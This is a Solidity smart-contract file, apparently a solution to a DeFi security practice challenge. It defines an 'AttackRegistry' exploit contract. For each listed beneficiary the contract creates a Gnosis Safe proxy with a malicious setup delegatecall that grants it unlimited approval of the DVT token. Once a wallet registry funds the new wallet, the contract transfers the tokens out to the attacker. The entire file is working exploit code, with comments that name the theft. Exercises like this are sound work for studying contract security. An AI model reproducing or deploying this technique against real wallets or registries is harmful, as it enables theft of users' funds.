// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

interface IGnosisSafeproxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract AttackRegistry {
    address public proxyFactoryAddress;
    address public walletRegistryAddress;
    address public gnosisSingletonAddress;
    address payable public dtvTokenAddress;

    constructor(
        address _proxyFactoryAddress,
        address _walletRegistryAddress,
        address _gnosisSingletonAddress,
        address payable _dtvTokenAddress
    ) {
        proxyFactoryAddress = _proxyFactoryAddress;
        walletRegistryAddress = _walletRegistryAddress;
        gnosisSingletonAddress = _gnosisSingletonAddress;
        dtvTokenAddress = _dtvTokenAddress;
    }

    /**
    DelegatedCalled to during setup,
    approves max tokens to be transferred by attacker
    from beneficiaries wallet
     */
    function approveDVT(address _spender, address _token) external {
        IERC20(_token).approve(_spender, type(uint256).max);
    }

    function attack(
        address _attacker,
        address[] calldata _beneficiaries,
        uint256 _transferAmount
    ) external {
        for (uint256 i = 0; i < _beneficiaries.length; i++) {
            //Setup owner of wallet
            address[] memory owners = new address[](1);
            owners[0] = _beneficiaries[i];

            //Data to call approveDVT during setup
            bytes memory setupData = abi.encodeWithSignature(
                "approveDVT(address,address)",
                address(this),
                dtvTokenAddress
            );

            /**
            Data to be used during proxy wallet creation,
            contains malicious setupData
             */
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                setupData,
                address(0),
                address(0),
                0,
                address(0)
            );

            //Create proxy with malicous setup and register the new wallet in the registry
            GnosisSafeProxy proxy = IGnosisSafeproxyFactory(proxyFactoryAddress)
                .createProxyWithCallback(
                    gnosisSingletonAddress,
                    initializer,
                    0,
                    IProxyCreationCallback(walletRegistryAddress)
                );

            //Attacker steals tokens after the registry has transferred them to new wallet
            IERC20(dtvTokenAddress).transferFrom(
                address(proxy),
                _attacker,
                _transferAmount
            );
        }
    }
}
